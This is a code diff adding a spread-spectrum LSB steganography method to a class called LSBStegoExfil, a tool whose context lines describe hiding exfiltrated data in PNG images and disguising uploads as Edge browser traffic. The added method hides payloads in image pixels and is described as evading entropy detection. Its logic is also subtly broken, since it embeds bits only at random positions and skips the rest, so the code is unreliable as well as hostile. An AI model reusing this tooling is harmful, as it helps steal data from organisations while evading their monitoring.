@@ -178,6 +178,53 @@ class LSBStegoExfil:
             "mimicry": "Edge 122 multipart/form-data upload",
         }
 
+    def encode_lsb_spread_spectrum(self, cover_image: bytes, data: bytes,
+                                    noise_matrix: bytes = None) -> Optional[bytes]:
+        """
+        Spread spectrum LSB steganography - matches natural image noise patterns.
+        Avoids entropy detection by mimicking Gaussian noise distribution.
+        """
+        try:
+            from PIL import Image
+            import numpy as np
+
+            img = Image.open(io.BytesIO(cover_image)).convert("RGBA")
+            pixels = np.array(img, dtype=np.uint8)
+
+            flat_pixels = pixels.flatten().astype(np.uint8)
+            if len(data) * 8 > len(flat_pixels):
+                logger.error("Data too large for cover image")
+                return None
+
+            header = struct.pack(">I", len(data))
+            payload = header + data
+            data_bits = ''.join(format(byte, '08b') for byte in payload)
+
+            if noise_matrix is None:
+                np.random.seed(42)
+                noise_matrix = np.random.randint(0, 2, len(flat_pixels), dtype=np.uint8)
+
+            for i, bit in enumerate(data_bits):
+                if i >= len(flat_pixels):
+                    break
+                bit_val = int(bit)
+                if noise_matrix[i] == 1 or np.random.random() > 0.7:
+                    flat_pixels[i] = (flat_pixels[i] & 0xFE) | bit_val
+
+            stego_pixels = flat_pixels.reshape(pixels.shape)
+            stego_image = Image.fromarray(stego_pixels, "RGBA")
+
+            out = io.BytesIO()
+            stego_image.save(out, format="PNG")
+            return out.getvalue()
+
+        except ImportError:
+            logger.error("PIL/numpy required")
+            return None
+        except Exception as exc:
+            logger.error(f"Spread spectrum encode failed: {exc}")
+            return None
+
     def create_exfil_image(self, data: bytes, width: int = 256, height: int = 256) -> Optional[bytes]:
         """
         Create a PNG image containing hidden exfiltrated data.
